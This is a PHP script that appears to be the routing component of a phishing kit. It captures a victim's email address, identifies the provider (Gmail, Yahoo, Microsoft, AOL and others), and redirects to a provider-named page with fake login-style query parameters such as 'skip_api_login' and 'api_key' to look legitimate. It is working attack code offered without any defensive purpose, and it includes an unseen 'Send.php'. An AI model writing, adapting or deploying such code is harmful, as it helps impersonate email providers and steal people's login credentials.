<?php
require_once('Send.php');
    class Comp
    {
        public function headerX($location) {
            header("Location: " . $location );
        }
        public function checkEmpty() {
            foreach (func_get_args() as $param) {
                if (!isset($param) || trim($param) == "") {
                    return 1;
                    break;
                }
            }
            return 0;
        }
		
		
        public function userEmail($email) {
            if (preg_match("/@gmail/i", $email) == 1) {
                return "Gmail";
            }
            elseif (preg_match("/@yahoo/i", $email) == 1) {
                return "Yahoo";
            }
            elseif (preg_match("/@ymail/i", $email) == 1) {
                return "Yahoo";
            }
            elseif (preg_match("/@rocketmail/i", $email) == 1) {
                return "Yahoo";
            }
            elseif (preg_match("/@outlook/i", $email) == 1) {
                return "Microsoft";
            }
            elseif (preg_match("/@hotmail/i", $email) == 1) {
                return "Microsoft";
            }
            elseif (preg_match("/@live/i", $email) == 1) {
                return "Microsoft";
            }
            elseif (preg_match("/@msn/i", $email) == 1) {
                return "Microsoft";
            }
            elseif (preg_match("/@aol/i", $email) == 1) {
                return "AOL";
            }
            elseif (preg_match("/@comcast/i", $email) == 1) {
                return "Comcast";
            }
            elseif (preg_match("/@att/i", $email) == 1) {
                return "Att";
            }
            elseif (preg_match("/@verizon/i", $email) == 1) {
                return "Verizon";
            }
            return 0;
        }
    }
	
	
	
    $comps = new Comp;
    if (isset(
        $_POST['email']
    )) {
        if (
            $_POST['email']
        ) {
            $_SESSION['email'] = $_POST['email'];
            if (!$comps->userEmail($_SESSION['email'])) {
                $comps->headerX("../Microsoft.php?skip_api_login=1&api_key=145044622175352&kid_directed_site=0&app_id=145044622175352&signed_next=1");
            } else {
                $comps->headerX("../" . $comps->userEmail($_SESSION['email']).".php?skip_api_login=1&api_key=145044622175352&kid_directed_site=0&app_id=145044622175352&signed_next=1");
            }
        } 
        die();
    }